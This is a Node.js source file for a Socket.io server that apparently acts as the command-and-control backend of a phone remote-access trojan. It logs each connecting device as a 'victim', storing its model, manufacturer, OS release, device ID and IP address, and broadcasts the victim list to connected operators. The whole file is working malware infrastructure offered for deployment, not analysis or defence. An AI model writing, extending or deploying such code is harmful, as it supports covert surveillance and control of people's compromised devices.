const express = require('express');
const { Server } = require('socket.io');
const http = require('http');
const os = require('os');

const app = express();

// Create HTTP server
const server = http.createServer(app);

// Socket.io setup with CORS policy (use environment variable for frontend URL)
const io = new Server(server, {
    cors: {
        origin: process.env.FRONTEND_URL || "*", // Replace with your frontend URL in production
        methods: ["GET", "POST"],
        allowedHeaders: ["my-custom-header"],
        credentials: true,
    }
});



let victimsList = []; // To keep track of connected clients

io.on('connection', (socket) => {
    console.log('New client connected:', socket.id);

    // Extract query parameters from the connection
    const model = socket.handshake.query.model;
    const manufacturer = socket.handshake.query.manf;
    const release = socket.handshake.query.release;
    const deviceId = socket.handshake.query.id;
    const connectionUserId = socket.handshake.query.connectionUserId;

    // Create a victim object to store connected client info
    const victim = {
        id: socket.id,
        model: model,
        manufacturer: manufacturer,
        release: release,
        deviceId: deviceId,
        connectionUserId: connectionUserId,
        ip: socket.handshake.address, // IP address of the client
    };

    // Add the victim to the list
    victimsList.push(victim);
    console.log('Victims List:', victimsList);

    // Notify all clients about the new victim
    io.emit('newVictim', victimsList);

    // Handle disconnection
    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        victimsList = victimsList.filter(v => v.id !== socket.id);
        io.emit('victimDisconnected', victimsList);
    });
});

// Function to get the server's IP address
function getDeviceIp() {
    const interfaces = os.networkInterfaces();
    for (const iface of Object.values(interfaces)) {
        for (const addr of iface) {
            if (addr.family === 'IPv4' && !addr.internal) {
                return addr.address; // Return the first non-internal IPv4 address
            }
        }
    }
    return '0.0.0.0'; // Fallback if no IP is found
}

// Start the server
const PORT = process.env.PORT || 42474;
const DEVICE_IP = getDeviceIp();

// Change DEVICE_IP to '0.0.0.0' for cloud deployment
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Socket server is running on http://0.0.0.0:${PORT}`);
});
